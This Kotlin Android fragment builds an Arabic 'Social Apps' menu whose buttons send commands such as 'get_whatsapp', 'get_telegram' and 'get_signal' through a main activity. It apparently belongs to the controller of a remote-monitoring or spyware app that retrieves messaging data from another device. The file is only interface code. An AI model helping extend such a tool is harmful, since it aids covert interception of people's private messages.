package com.abuzahra.control.ui.social

import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.TextView
import androidx.fragment.app.Fragment
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.abuzahra.control.MainActivity
import com.abuzahra.control.R
import com.abuzahra.control.adapter.ActionAdapter
import com.abuzahra.control.adapter.ActionItem

class SocialFragment : Fragment() {
    private val actions = listOf(
        ActionItem("💚", "واتساب", "get_whatsapp"),
        ActionItem("🔵", "تليجرام", "get_telegram"),
        ActionItem("🟣", "إنستجرام", "get_instagram"),
        ActionItem("💬", "ماسنجر", "get_messenger"),
        ActionItem("💛", "سناب شات", "get_snapchat"),
        ActionItem("🎵", "تيك توك", "get_tiktok"),
        ActionItem("🐦", "تويتر / X", "get_twitter"),
        ActionItem("💜", "فايبر", "get_viber"),
        ActionItem("🔵", "سيجنال", "get_signal"),
        ActionItem("🔵", "فيسبوك", "get_facebook")
    )

    override fun onCreateView(inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?): View? {
        return try {
            inflater.inflate(R.layout.fragment_generic, container, false)
        } catch (t: Throwable) {
            Log.e("Social", "inflate error: ${t.message}")
            TextView(requireContext()).apply { text = "خطأ" }
        }
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        try {
            view.findViewById<TextView>(R.id.tvSectionTitle)?.text = "التطبيقات الاجتماعية"
            val rv = view.findViewById<RecyclerView>(R.id.rvActions)
            rv?.layoutManager = LinearLayoutManager(requireContext())
            rv?.adapter = ActionAdapter(actions) { a ->
                try { (activity as? MainActivity)?.sendCommand(a.command) } catch (_: Throwable) {}
            }
        } catch (t: Throwable) {
            Log.e("Social", "onViewCreated CRASH: ${t.javaClass.simpleName}: ${t.message}")
        }
    }
}
